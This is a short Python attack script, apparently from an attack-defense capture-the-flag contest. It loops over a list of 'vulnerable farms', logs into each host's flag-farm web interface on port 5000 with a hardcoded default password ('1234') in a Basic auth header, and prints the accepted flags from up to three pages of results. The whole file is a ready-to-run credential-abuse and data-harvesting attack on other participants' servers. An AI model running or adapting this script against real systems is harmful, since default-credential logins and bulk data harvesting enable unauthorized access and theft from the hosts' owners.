#!/usr/bin/env python3
import requests
import json
from ips import ips

def connect(addr,page):
    headers = {'Authorization' : 'Basic OjEyMzQ='}
    data =  {"sploit":"","team":"","flag":"","time-since":"","time-until":"","status":"ACCEPTED","checksystem_response":"", "page-number":f"{page}",'Authorization' : 'Basic OjEyMzQ='}

    try:
        r = requests.post(addr,headers=headers,data=data,timeout=5)
    except:
        return False

    parsed = json.loads(r.text)["rows"]
    if parsed:
        for res in parsed:
                print(res["flag"])
        return True

    return False

if ips != {}:
    for ip in ips:
        page = 1
        addr = f"http://{ip}:5000/ui/show_flags"

        while connect(addr,page) and page <= 3:
            page+=1
else:
    print("No vulnerable farms found")


